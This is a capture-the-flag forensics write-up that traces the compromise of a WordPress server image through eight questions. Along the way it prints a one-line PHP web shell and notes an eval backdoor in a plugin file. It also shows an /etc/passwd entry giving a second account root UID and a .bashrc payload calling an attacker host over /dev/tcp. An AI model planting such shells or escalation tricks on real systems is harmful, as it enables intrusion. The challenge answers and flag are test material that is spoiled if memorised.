---
tags:
  - ctf
  - 2023-tcp1p
  - forensics
  - linux
  - wordpress
layout: ctf
type: problem
ctf: 2023-tcp1p
category: forensics
title: Hacked
points: 275
solved: true
---

# Hacked

## Instructions

**Author**: `daffainfo`

I just deployed a website on Linux, but 5 minutes later, suddenly, someone hacked the server, and the attacker managed to gain root access. Can you investigate my server and answer some questions related to this hack?

`nc ctf.tcp1p.com 23678`

## Solution

For this challenge we're provided a gunzipped tar archive of a Linux filesystem. I decompressed the tar archive and used [ratarmount](https://github.com/mxmlnkn/ratarmount) to mount the archive as a local directory without having to extract it. 

```
$ gunzip -d archive.tar.gz
$ ./ratarmount-0.14.0-x86_64.AppImage archive.tar a/
```

### Question 1
```
Q1:
Question: What is the hostname of the server?
Format: example-hostname
```

Check `/etc/hostname` for the hostname.

```
$ cat etc/hostname 
forensic-tcp1p
```

```
Answer: forensic-tcp1p
```

### Question 2

```
Q2:
Question: What applications does the system administrator deploy on this server? Also include the application version
Format: Example:13.37
```

I approached this by checking the apt history at `/var/log/apt/history.log` and seeing that webserver packages such as Apache, PHP, and MySQL were being installed. From here, I checked `/var/www/html` and saw that Wordpress was installed. Checking `wp-admin/about.php` gave me the installed Wordpress version.

```
Answer: Wordpress:6.3.1
```

### Question 3


```
Q3:
Question: How many plugins are installed on this WordPress?
Format: 2
```

I checked the Wordpress plugins folder to see that 4 plugins are installed.

```
$ ls -ln wp-content/plugins/
total 3
drwxrwxrwx 1 33 33  0 Oct  4 01:41 elementor
drwxrwxrwx 1 33 33  0 Oct  3 23:33 import-xml-feed
-rwxrwxrwx 1 33 33 28 Jun  5  2014 index.php
drwxrwxrwx 1 33 33  0 Oct  4 01:59 jetpack
drwxrwxrwx 1 33 33  0 Oct  4 01:41 woocommerce
```

```
Answer: 4
```


### Question 4

```
Q4:
Question: Can you give me the CVE ID that the attacker used to attack this server?
Format: CVE-2020-13337
```

Checking for uploads, I found a a suspicious looking PHP file. Looking up CVEs for the `import-xml-feed` plugin shows that this is related to a CVE: https://nvd.nist.gov/vuln/detail/CVE-2023-4521 

```
$ find . -type d | grep uploads | xargs ls
./wp-content/plugins/import-xml-feed/uploads:
169227090864de013cac47b.php

$ cat wp-content/plugins/import-xml-feed/uploads/169227090864de013cac47b.php 
<?php system($_GET['cmd']);?>
```

```
Answer: CVE-2023-4521
```

### Question 5


```
Q5:
Question: By utilizing CVE-2023-4521, the attacker seems to have placed another PHP backdoor on this server. What is the full location where the attacker put the backdoor? (It looks like there is something suspicious in the WordPress plugins)
Format: /path/to/file
```

I used https://github.com/tstillz/webshell-scan to scan for additional webshells.

```
$ ./webscan_linux -dir tcp1p2023/hacked/a/var/www/html/wordpress/wp-content/plugins/
```

```
{"filePath":"tcp1p2023/hacked/a/var/www/html/wordpress/wp-content/plugins/jetpack/class.jetpacks.php","size":172,"md5":"597a702737863ed3b3ecd034bf3bc2f7","timestamps":{"created":"1970-01-01 00:00:00","modified":"2023-10-04 08:59:23","accessed":"1970-01-01 00:00:00"},"matches":{"eval(":1}}
```

```
Answer: /var/www/html/wordpress/wp-content/plugins/jetpack/class.jetpacks.php
```


### Question 6


```
Q6:
Question: Can you provide the file that the attacker used for privilege escalation?
Format: /path/to/file

```

Investigating `/var/log/auth.log` shows that the permissions of `/etc/passwd` were modified during installation. The attacker used this to edit their UID and GID to 0 (root). 

```
$ less ./var/log/auth.log

2023-10-04T07:55:29.579415+00:00 forensic-tcp1p sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/chmod 666 /etc/passwd

```

```
/etc/passwd

userssss::0:0::/root:/bin/bash
```

```
Answer: /etc/passwd
```

### Question 7

```
Q7:
Question: After gaining root access, the attacker insert another dangerous file? Please provide us with the full location/path of that file.
Format: /path/to/file
```

I searched for files that were modified after the `/etc/passwd` modification. The `/root/.bashrc` file had a suspicious entry.

```
$ find . -newermt "2023-10-04 02:03:00" -type f 
./etc/passwd
./root/.bashrc
./root/READ_THIS_ADMIN_HAHAHA.txt
./var/lib/landscape/landscape-sysinfo.cache
./var/lib/systemd/timers/stamp-phpsessionclean.timer
./var/lib/systemd/timesync/clock
./var/log/apache2/access.log
./var/log/apache2/error.log
./var/log/auth.log
./var/log/btmp
./var/log/droplet-agent.update.log
./var/log/journal/137ae57915b64621a0a322a4c14d2d56/system.journal
./var/log/lastlog
./var/log/syslog
./var/log/wtmp
```

```
Answer: /root/.bashrc
```


### Question 8

```
Q8:
Question: Based on the file planted by the attacker, can you give me the IP and port of the server used by the attacker?
Format: 160.32.183.32:1337
```

Executing the suspicious bash in the `/root/.bashrc` file in an isolated sandbox without network connectivity gives us the host that it attempts to reach out to.

```
main.bash: connect: Network is unreachable
main.bash: line 1: /dev/tcp/159.223.46.222/9999: Network is unreachable
```

```
Answer: 159.223.46.222:9999
```


### Flag

```
Congrats! Flag: TCP1P{y0u_f0und_m3_H4h4hHH44h44_B18DeF73F73FFe}****
```